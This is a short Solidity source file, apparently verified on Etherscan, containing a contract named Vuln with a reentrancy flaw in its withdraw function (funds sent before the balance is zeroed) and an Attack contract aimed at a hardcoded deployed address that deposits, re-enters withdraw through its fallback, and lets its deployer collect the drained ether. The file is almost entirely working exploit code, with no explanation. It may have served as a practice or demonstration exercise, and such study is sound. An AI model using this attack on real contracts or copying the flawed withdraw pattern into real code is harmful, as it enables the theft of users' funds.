/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

pragma solidity ^0.6.0;
//address = 0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack
{
    address sendr;
    address cont_addr;
    uint public count = 1;
    Vuln public v = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    constructor() public
    {
        sendr = msg.sender;
        cont_addr = address(this);
    }
    function steal() public payable
    {
        v.deposit.value(msg.value)();
        v.withdraw();
    }

    fallback() external payable
    {
        if(count < 3)
        {
            count = count + 1;
            v.withdraw();
        }
    }
    function transfer() public
    {
        if(msg.sender == sendr)
        {
            require(msg.sender.send(address(this).balance));
        }
    }
}